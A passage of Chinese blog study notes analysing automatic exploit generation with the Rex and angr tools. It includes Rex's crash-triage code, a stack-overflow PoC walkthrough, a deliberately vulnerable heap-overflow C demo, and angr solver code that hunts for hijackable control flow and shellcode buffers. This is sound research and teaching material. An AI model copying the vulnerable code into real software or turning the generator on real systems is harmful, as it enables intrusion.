class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_triage_crash</span><span class="params">(self)</span>:</span></span><br><span class="line">    ip = self.state.regs.ip</span><br><span class="line">    bp = self.state.regs.bp</span><br><span class="line"></span><br><span class="line">    <span class="comment"># any arbitrary receives or transmits</span></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> receives</span></span><br><span class="line">    zp = self.state.get_plugin(<span class="string">'zen_plugin'</span>) <span class="keyword">if</span> self.os == <span class="string">'cgc'</span> <span class="keyword">else</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">if</span> zp <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> len(zp.controlled_transmits):</span><br><span class="line">        l.debug(<span class="string">"detected arbitrary transmit vulnerability"</span>)</span><br><span class="line">        self.crash_types.append(Vulnerability.ARBITRARY_TRANSMIT)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we assume a symbolic eip is always exploitable</span></span><br><span class="line">    <span class="keyword">if</span> self.state.solver.symbolic(ip):</span><br><span class="line">        <span class="comment"># how much control of ip do we have?</span></span><br><span class="line">        <span class="keyword">if</span> self._symbolic_control(ip) &gt;= self.state.arch.bits:</span><br><span class="line">            l.info(<span class="string">"detected ip overwrite vulnerability"</span>)</span><br><span class="line">            self.crash_types.append(Vulnerability.IP_OVERWRITE)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l.info(<span class="string">"detected partial ip overwrite vulnerability"</span>)</span><br><span class="line">            self.crash_types.append(Vulnerability.PARTIAL_IP_OVERWRITE)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.state.solver.symbolic(bp):</span><br><span class="line">        <span class="comment"># how much control of bp do we have</span></span><br><span class="line">        <span class="keyword">if</span> self._symbolic_control(bp) &gt;= self.state.arch.bits:</span><br><span class="line">            l.info(<span class="string">"detected bp overwrite vulnerability"</span>)</span><br><span class="line">            self.crash_types.append(Vulnerability.BP_OVERWRITE)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l.info(<span class="string">"detected partial bp overwrite vulnerability"</span>)</span><br><span class="line">            self.crash_types.append(Vulnerability.PARTIAL_BP_OVERWRITE)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># if nothing obvious is symbolic let's look at actions</span></span><br><span class="line">    <span class="comment"># grab the all actions in the last basic block</span></span><br><span class="line">    symbolic_actions = [ ]</span><br><span class="line">    <span class="keyword">if</span> self._t <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> self._t.last_state <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        recent_actions = reversed(self._t.last_state.history.recent_actions)</span><br><span class="line">        state = self._t.last_state</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> this is a dead assignment! what was this supposed to be?</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        recent_actions = reversed(self.state.history.actions)</span><br><span class="line">        state = self.state</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> recent_actions:</span><br><span class="line">        <span class="keyword">if</span> a.type == <span class="string">'mem'</span>:</span><br><span class="line">            <span class="keyword">if</span> self.state.solver.symbolic(a.addr):</span><br><span class="line">                symbolic_actions.append(a)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> pick the crashing action based off the crashing instruction address,</span></span><br><span class="line">    <span class="comment"># crash fixup attempts will break on this</span></span><br><span class="line">    <span class="comment">#import ipdb; ipdb.set_trace()</span></span><br><span class="line">    <span class="keyword">for</span> sym_action <span class="keyword">in</span> symbolic_actions:</span><br><span class="line">        <span class="keyword">if</span> sym_action.action == <span class="string">"write"</span>:</span><br><span class="line">            <span class="keyword">if</span> self.state.solver.symbolic(sym_action.data):</span><br><span class="line">                l.info(<span class="string">"detected write-what-where vulnerability"</span>)</span><br><span class="line">                self.crash_types.append(Vulnerability.WRITE_WHAT_WHERE)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l.info(<span class="string">"detected write-x-where vulnerability"</span>)</span><br><span class="line">                self.crash_types.append(Vulnerability.WRITE_X_WHERE)</span><br><span class="line">             self.violating_action = sym_action</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> sym_action.action == <span class="string">"read"</span>:</span><br><span class="line">            <span class="comment"># special vulnerability type, if this is detected we can explore the crash further</span></span><br><span class="line">            l.info(<span class="string">"detected arbitrary-read vulnerability"</span>)</span><br><span class="line">            self.crash_types.append(Vulnerability.ARBITRARY_READ)</span><br><span class="line">            </span><br><span class="line">            self.violating_action = sym_action</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure></p><p>Rex 中对漏洞类型的定义如下：<br><img src="/2019/01/23/rex-crash/vulnerability.png" alt=""></p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>以上是对 Rex 复现 Crash 部分的简要分析，原理上是依靠 Concolic Execution，工程实现上主要依靠 QEMU 与 Angr。粗浅的表面分析，后续逐步深入。 </p>]]></content>
      
      
      <categories>
          
          <category> AEG </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CGC </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Rex AEG：栈溢出之 Exploit 自动生成</title>
      <link href="/2019/01/17/Rex-stacksmash/"/>
      <url>/2019/01/17/Rex-stacksmash/</url>
      
        <content type="html"><![CDATA[<p>本文通过调试 test_rex.py 中的 test_linux_stacksmash() 函数，以加深对 Rex 的理解。测试函数 test_linux_stacksmash() 是 Rex 开发团队给出的测试代码，用以展示 Rex 对栈溢出漏洞的自动利用能力。官方提供的测试样例 vuln_stacksmash 为 elf 格式的可执行文件，其中存在栈溢出漏洞，Rex 通过 rop2system、rop2text、jmpesp 三种方式实现了对该漏洞的自动化利用。下文为学习笔记，若存在理解有误的地方，请各位师傅批评指正。</p><a id="more"></a><h2 id="0x00-vuln-stacksmash-栈溢出漏洞"><a href="#0x00-vuln-stacksmash-栈溢出漏洞" class="headerlink" title="0x00 vuln_stacksmash 栈溢出漏洞"></a>0x00 vuln_stacksmash 栈溢出漏洞</h2><p>通过 r2 查看 vuln_stacksmash。sym.vuln 函数中，系统所分配的空闲空间为 0x58，使用 read(int fd, void * buf, size_t count) 函数读入数据时，count 设置为 0x100，超出系统所分配的空闲空间 0x58，导致栈溢出。<br><img src="/2019/01/17/Rex-stacksmash/asm-vul.png" alt=""></p><p>使用 GDB 调试 vuln_stacksmash，分析溢出点状态。调试时需注意，main() 函数中调用 sym.imp.system 时创建了新进程，因此需要在 GDB 中设置 <code>set follow-fork-mode parent</code>，使 GDB 始终附加在父进程中。<br><img src="/2019/01/17/Rex-stacksmash/asm-main.png" alt=""><br>否则在调试过程 GDB 会跟踪至子进程并自动退出。<br><img src="/2019/01/17/Rex-stacksmash/exit.png" alt=""></p><p>首先查看 vuln_stacksmash 保护机制开启情况，由下图可知未开启任何保护机制。<br><img src="/2019/01/17/Rex-stacksmash/checksec.png" alt=""></p><p>使用 GDB 加载 vuln_stacksmash，运行至溢出点，程序状态如下：<br><img src="/2019/01/17/Rex-stacksmash/stack.png" alt=""></p><p>计算偏移为 0x44，构造 PoC 并输入。检查栈上的数据情况，可见 EBP 已被 <code>“\x41\x41\x41\x41”</code> 覆盖，后续四个字节为 EIP 值，也已被覆盖为<code>“\x42\x42\x42\x42”</code>。<br><img src="/2019/01/17/Rex-stacksmash/smash.png" alt=""></p><p>跟踪至 <code>ret</code> 指令，触发异常，EIP 被劫持为<code>“\x42\x42\x42\x42”</code>。<br><img src="/2019/01/17/Rex-stacksmash/eip.png" alt=""></p><p>由于 vuln_stacksmash 存在典型栈溢出漏洞，且未开启安全机制，因此存在多种利用方式。下文概要分析如何使用 Rex 自动生成 Exploit。</p><h2 id="0x01-test-linux-stacksmash"><a href="#0x01-test-linux-stacksmash" class="headerlink" title="0x01 test_linux_stacksmash()"></a>0x01 test_linux_stacksmash()</h2><p>由于 Rex 封装的原因，整体代码看起来较为简洁，从漏洞复现、漏洞类型判定、Exploit 生成到漏洞验证，共计 10 行代码。其中，Crash 类用以复现漏洞并返回漏洞类型，Exploit类用以判定漏洞的可利用性，并生成 exploit。171 ~ 174 行代码用以验证 Exploit 的有效性。<br><img src="/2019/01/17/Rex-stacksmash/code.png" alt=""></p><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>采用 concolic-execution 复现 Crash 状态，相关功能在 Crash 类中实现。在本例中，初始化 rex.Crash()时，共传入以下参数：</p><ul><li>:param binary: vuln_stacksmash 全路径</li><li>:param crash:  PoC</li><li>:param fast_mode: 传入 True，代表将 Angrop 设置为快速查找模式</li><li>:param rop_cache_path: 从该文件中查找 gadgets</li><li>:param tracer_args</li></ul><p><strong>1、Concrete Execution</strong><br>通过 QEMU 加载二进制程序，以 PoC 为输入运行，复现 crash_state，运行结果如下：<br><img src="/2019/01/17/Rex-stacksmash/qemu.png" alt=""></p><p><strong>2、Concolic Execution</strong><br>在获取到 Crash state 之后，基于 Angr 实现 Concolic Execution。首先设置程序初始状态。<br><img src="/2019/01/17/Rex-stacksmash/full_init_state.png" alt=""><br><img src="/2019/01/17/Rex-stacksmash/initial_state_code.png" alt=""></p><p>使用 ‘posix’、’preconstrainer’ 插件辅助分析：<br><img src="/2019/01/17/Rex-stacksmash/register_plugin.png" alt=""></p><p>使用 ‘Tracer’、’Oppologist’ 两种 Exploration_techniques：<br><img src="/2019/01/17/Rex-stacksmash/explore_tech.png" alt=""><br><img src="/2019/01/17/Rex-stacksmash/et.png" alt=""></p><p>设置 simulation_manager ：<br><img src="/2019/01/17/Rex-stacksmash/sm.png" alt=""></p><p>执行结果:<br><img src="/2019/01/17/Rex-stacksmash/angr-analysis.png" alt=""></p><h2 id="0x03-漏洞类型判定"><a href="#0x03-漏洞类型判定" class="headerlink" title="0x03 漏洞类型判定"></a>0x03 漏洞类型判定</h2><p>_triage_crash() 函数依据原理对漏洞类型进行判定。<br><img src="/2019/01/17/Rex-stacksmash/triage_code.png" alt=""></p><p>执行结果为 <code>IP_OVERWRITE</code>：<br><img src="/2019/01/17/Rex-stacksmash/triage.png" alt=""></p><h2 id="0x04-可利用性判定"><a href="#0x04-可利用性判定" class="headerlink" title="0x04 可利用性判定"></a>0x04 可利用性判定</h2><p>仅对以下十二类漏洞能够生成 Exploit。<br><img src="/2019/01/17/Rex-stacksmash/vulnerability.png" alt=""></p><h2 id="0x05-ExploitFactory"><a href="#0x05-ExploitFactory" class="headerlink" title="0x05 ExploitFactory"></a>0x05 ExploitFactory</h2><p>代码中设置了 rop_leak_memory、rop_set_register、 explore_for_exploit 三种利用方式。读过源码后发现， rop_leak_memory、rop_set_register 均是针对 CGC 格式文件的利用技术。 在已有的九种 exploit_technique 中，仅有 call_jmp_sp_shellcode、call_shellcode、rop_to_system 用以针对 elf 文件。执行结果如下：<br><img src="/2019/01/17/Rex-stacksmash/exp.png" alt=""></p><h2 id="0x06-Verified"><a href="#0x06-Verified" class="headerlink" title="0x06 Verified"></a>0x06 Verified</h2><p>对三种生成结果进行确认。<br><img src="/2019/01/17/Rex-stacksmash/test.png" alt=""><br><img src="/2019/01/17/Rex-stacksmash/last.png" alt=""></p><h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><p>通过阅读并调试 test_linux_stacksmash()，直观感受了 Rex 对栈溢出漏洞的利用过程，加深了对 Rex 的理解，特别是采用 concolic-execution 复现 Crash 部分。但目前对其中的 Explore_technique、Exploit_technique 等内容理解并不深入，在后续学习过程中逐步完善。</p>]]></content>
      
      
      <categories>
          
          <category> AEG </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CGC </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>angr AEG：缓冲区溢出之 Exploit 自动生成</title>
      <link href="/2019/01/09/insomnihack-aeg/"/>
      <url>/2019/01/09/insomnihack-aeg/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/angr/angr-doc/tree/master/examples/insomnihack_aeg" target="_blank" rel="noopener">insomnihack_aeg</a> 为官方提供的示例，用以展示 Angr 利用符号执行进行漏洞挖掘并自动生成 Exploit 的能力。代码 <a href="https://github.com/angr/angr-doc/blob/master/examples/insomnihack_aeg/demo_bin.c" target="_blank" rel="noopener">demo_bin.c</a> 中存在堆溢出漏洞，通过脚本 <a href="https://github.com/angr/angr-doc/blob/master/examples/insomnihack_aeg/solve.py" target="_blank" rel="noopener">solver.py</a> 成功挖掘出该漏洞并自动生成 Exploit。</p><a id="more"></a><h2 id="0x00-demo-bin-c"><a href="#0x00-demo-bin-c" class="headerlink" title="0x00 demo_bin.c"></a>0x00 demo_bin.c</h2><p>典型的堆溢出，第 21 行，由于未对边界条件进行检查，溢出数据覆盖函数指针，当 38 行调用 do_something() 时，导致 Crash。完整代码如下：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> component_name[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">component</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">int</span> (*do_something)(<span class="keyword">int</span> arg);</span><br><span class="line">&#125; <span class="keyword">comp_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sample_func</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">" - %s - recieved argument %d\n"</span>, component_name, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">comp_t</span> *initialize_component(<span class="keyword">char</span> *cmp_name) &#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">comp_t</span> *cmp;</span><br><span class="line"></span><br><span class="line">    cmp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct component));</span><br><span class="line">    cmp-&gt;do_something = sample_func;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Copying component name...\n"</span>); </span><br><span class="line">    <span class="keyword">while</span> (*cmp_name)</span><br><span class="line">        cmp-&gt;name[i++] = *cmp_name++;</span><br><span class="line"></span><br><span class="line">    cmp-&gt;name[i] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> cmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">comp_t</span> *cmp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Component Name:\n"</span>);</span><br><span class="line">    read(<span class="number">0</span>, component_name, <span class="keyword">sizeof</span> component_name);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Initializing component...\n"</span>);</span><br><span class="line">    cmp = initialize_component(component_name);    </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Running component...\n"</span>);</span><br><span class="line">    cmp-&gt;do_something(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-Solve-py"><a href="#0x01-Solve-py" class="headerlink" title="0x01 Solve.py"></a>0x01 Solve.py</h2><p>漏洞原理很简单，不再赘述。利用符号执行判断是否存在控制流劫持，关键在于检测 EIP，若 EIP 完全被符号变量覆盖，则代表着控制流已被劫持。完整的 AEG 过程如下：<br>1）漏洞挖掘，带有前置约束及路径选择策略的符号执行；<br>2）分析发生崩溃时的 EIP 状态；<br>3）分析发生崩溃时的内存布局<br>4）构造约束条件；<br>5）约束求解，生成 Exploit。</p><h3 id="1、漏洞挖掘"><a href="#1、漏洞挖掘" class="headerlink" title="1、漏洞挖掘"></a>1、漏洞挖掘</h3><p>脚本中第 13 ~ 24 行，利用 SimulationManager 的 step() 方法，搜索二进制程序的状态空间。由于代码逻辑较为简单，因此在路径探索的过程中并未添加缓解路径爆炸的前置约束，也未采用路径选择策略，仅使用简单的 step()。循环执行，直到出现 <code>unconstrained</code> 状态。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">p = angr.Project(binary)</span><br><span class="line"></span><br><span class="line">binary_name = os.path.basename(binary)</span><br><span class="line"></span><br><span class="line">extras = &#123;so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY&#125;</span><br><span class="line">es = p.factory.entry_state(add_options=extras)</span><br><span class="line">sm = p.factory.simulation_manager(es, save_unconstrained=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># find a bug giving us control of PC</span></span><br><span class="line">l.info(<span class="string">"looking for vulnerability in '%s'"</span>, binary_name)</span><br><span class="line">exploitable_state = <span class="keyword">None</span></span><br><span class="line"><span class="keyword">while</span> exploitable_state <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    print(sm)</span><br><span class="line">    sm.step()</span><br><span class="line">    <span class="keyword">if</span> len(sm.unconstrained) &gt; <span class="number">0</span>:</span><br><span class="line">        l.info(<span class="string">"found some unconstrained states, checking exploitability"</span>)</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> sm.unconstrained:</span><br><span class="line">            <span class="keyword">if</span> fully_symbolic(u, u.regs.pc):</span><br><span class="line">                exploitable_state = u</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># no exploitable state found, drop them</span></span><br><span class="line">        sm.drop(stash=<span class="string">'unconstrained'</span>)</span><br><span class="line"></span><br><span class="line">l.info(<span class="string">"found a state which looks exploitable"</span>)</span><br><span class="line">ep = exploitable_state</span><br></pre></td></tr></table></figure><h3 id="2、分析-EIP"><a href="#2、分析-EIP" class="headerlink" title="2、分析 EIP"></a>2、分析 EIP</h3><p>当检测到 <code>unconstrained states</code> 时，调用 <code>fully_symbolic()</code>方法，查看 EIP 中符号变量的数量。当 EIP 完全被符号变量覆盖时，代表控制流已被劫持。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fully_symbolic</span><span class="params">(state, variable)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    check if a symbolic variable is completely symbolic</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(state.arch.bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> state.solver.symbolic(variable[i]):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure><p><code>fully_symbolic()</code>接收 state、variable 两个输入，用 state.arch.bits 判断所模拟系统的字长（The number of bits in a word），用 <code>symbolic()</code> 检测传入数据是否为符号值。该方法在“./angr/state_plugins/solver.py”中，实现代码如下：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">symbolic</span><span class="params">(self, e)</span>:</span> <span class="comment"># pylint: disable=R0201</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Returns True if the expression `e` is symbolic.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> type(e) <span class="keyword">in</span> (int, bytes, float, bool):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> e.symbolic</span><br></pre></td></tr></table></figure><p>在触发漏洞时，堆及 EIP 状态如下图所示。<br><img src="/2019/01/09/insomnihack-aeg/heap.png" alt=""><br>调试结果如下：<br><img src="/2019/01/09/insomnihack-aeg/eip.png" alt=""></p><h3 id="3、分析内存状态"><a href="#3、分析内存状态" class="headerlink" title="3、分析内存状态"></a>3、分析内存状态</h3><p>在满足<code>unconstrained</code>，且 EIP 完全被符号变量覆盖时，通过 <code>find_symbolic_buffer()</code> 检测内存中符号变量的布局情况，并构造约束条件。整个环节可分为查找符号输入、追踪符号变量、构造约束条件三个步骤。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># keep checking if buffers can hold our shellcode</span></span><br><span class="line"><span class="keyword">for</span> buf_addr <span class="keyword">in</span> find_symbolic_buffer(ep, len(shellcode)):</span><br><span class="line">    l.info(<span class="string">"found symbolic buffer at %#x"</span>, buf_addr)</span><br><span class="line">    memory = ep.memory.load(buf_addr, len(shellcode))</span><br><span class="line">    sc_bvv = ep.solver.BVV(shellcode)</span><br></pre></td></tr></table></figure><p>1）查找符号输入<br>查找符号输入、追踪符号变量在<code>find_symbolic_buffer()</code>中实现，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_symbolic_buffer</span><span class="params">(state, length)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's</span></span><br><span class="line"><span class="string">    control</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get all the symbolic bytes from stdin</span></span><br><span class="line">    stdin = state.posix.stdin</span><br><span class="line"></span><br><span class="line">    sym_addrs = [ ]</span><br><span class="line">    <span class="keyword">for</span> _, symbol <span class="keyword">in</span> state.solver.get_variables(<span class="string">'file'</span>, stdin.ident):</span><br><span class="line">        sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> sym_addrs:</span><br><span class="line">        <span class="keyword">if</span> check_continuity(addr, sym_addrs, length):</span><br><span class="line">            <span class="keyword">yield</span> addr</span><br></pre></td></tr></table></figure><p>此处需注意，Angr 在处理 scanf 的输入数据时，采用 streams 模式。不仅如此，默认情况下，stdin、stdout、stderr 均采用该模式。<a href="https://github.com/angr/angr-doc/blob/139150e496ee00dea741639e841f0f6123070716/docs/file_system.md" target="_blank" rel="noopener">原文如下</a>  </p><blockquote><p>Believe it or not, this simpler abstraction for streams will benefit symbolic execution. Consider an example program that calls scanf N times to read in N strings. With a traditional SimFile, as we do not know the length of each input string, there does not exist any clear boundary in the file between these symbolic input strings. In this case, angr will perform N symbolic reads where each read will generate a gigantic tree of claripy ASTs, with string lengths being symbolic. This is a nightmare for constraint solving. Nevertheless, the fact that scanf is used on a stream (stdin) dictates that there will be zero overlap between individual reads, regardless of the sizes of each symbolic input string. We may as well model stdin as a stream that comprises of consecutive packets, instead of a file containing a sequence of bytes. Each of the packet can be of a fixed length or a symbolic length. Since there will be absolutely no byte overlap between packets, the constraints that angr will produce after executing this example program will be a lot simpler.<br>The key concept involved is “short reads”, i.e. when you ask for n bytes but actually get back fewer bytes than that. We use a different class implementing SimFileBase, SimPackets, to automatically enable support for short reads. By default, stdin, stdout, and stderr are all SimPackets objects.</p></blockquote><p>调试结果与文档描述一致：<br><img src="/2019/01/09/insomnihack-aeg/stdin.png" alt=""></p><p>2) 追踪符号变量<br><code>state.posix.stdin</code>为传入程序的全部符号变量，使用<code>state.solver.get_variables()</code> 追踪内存中的符号变量。该函数位于“./angr/state_plugins/solver.py”中，代码如下：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_variables</span><span class="params">(self, *keys)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Iterate over all variables for which their tracking key is a prefix of the values provided.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Elements are a tuple, the first element is the full tracking key, the second is the symbol.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; list(s.solver.get_variables('mem'))</span></span><br><span class="line"><span class="string">    [(('mem', 0x1000), &lt;BV64 mem_1000_4_64&gt;), (('mem', 0x1008), &lt;BV64 mem_1008_5_64&gt;)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; list(s.solver.get_variables('file'))</span></span><br><span class="line"><span class="string">    [(('file', 1, 0), &lt;BV8 file_1_0_6_8&gt;), (('file', 1, 1), &lt;BV8 file_1_1_7_8&gt;), (('file', 2, 0), &lt;BV8 file_2_0_8_8&gt;)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; list(s.solver.get_variables('file', 2))</span></span><br><span class="line"><span class="string">    [(('file', 2, 0), &lt;BV8 file_2_0_8_8&gt;)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; list(s.solver.get_variables())</span></span><br><span class="line"><span class="string">    [(('mem', 0x1000), &lt;BV64 mem_1000_4_64&gt;), (('mem', 0x1008), &lt;BV64 mem_1008_5_64&gt;), (('file', 1, 0), &lt;BV8 file_1_0_6_8&gt;), (('file', 1, 1), &lt;BV8 file_1_1_7_8&gt;), (('file', 2, 0), &lt;BV8 file_2_0_8_8&gt;)]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> self.eternal_tracked_variables.items():</span><br><span class="line">        <span class="keyword">if</span> len(k) &gt;= len(keys) <span 